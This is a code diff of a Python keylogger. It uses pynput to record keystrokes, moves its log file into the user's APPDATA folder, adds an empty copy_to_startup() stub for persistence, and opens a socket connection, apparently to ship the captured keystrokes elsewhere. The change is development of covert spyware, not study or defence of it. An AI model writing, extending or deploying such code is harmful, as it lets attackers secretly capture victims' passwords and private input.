@@ -1,5 +1,5 @@
 from pynput.keyboard import Listener
-from os import system, getenv, getlogin, makedirs, remove, path
+from os import system, getenv, getlogin, remove, path
 import socket
 from pickle import dumps
 Header = 10
@@ -12,8 +12,8 @@ class Global:
 
 class Logging:
 
-    def __init__(self, path_to_file):
-        self.path = path_to_file
+    def __init__(self, name_of_file):
+        self.path = getenv("appdata") + "\\" + name_of_file
 
     def return_log(self, only_check=False, return_as_array=False):
         # Method to check whether log file is created and to return its content
@@ -106,6 +106,9 @@ def key_press(key):
         Global.i = 0
         return False
 
+
+def copy_to_startup():
+    pass
 
 # Main Loop
 connection = Socket()
